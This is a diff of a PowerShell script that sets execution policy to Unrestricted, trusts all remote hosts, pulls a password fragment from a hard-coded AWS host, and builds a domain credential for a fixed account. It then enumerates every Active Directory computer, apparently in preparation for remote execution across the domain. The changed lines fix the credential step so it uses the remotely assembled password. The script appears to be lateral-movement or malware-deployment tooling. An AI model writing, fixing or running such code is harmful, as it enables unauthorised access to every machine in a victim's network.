@@ -12,13 +12,13 @@ set-executionpolicy Unrestricted
 Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
 $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
 $toAppend=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/eeee/timeZ.txt
-
-$username='magrene'
-$usernameB=((gwmi WIN32_ComputerSystem).Domain+'\magrene')
-[SecureString]$secureString = $userPassword | ConvertTo-SecureString -AsPlainText -Force 
-[PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
 $c0de='Tossking@'
 $c0de=$c0de+$toAppend
+$username='magrene'
+$usernameB=((gwmi WIN32_ComputerSystem).Domain+'\magrene')
+[SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
+[PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
+
 if($osInfo.ProductType -ne 1){
     $computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
 }
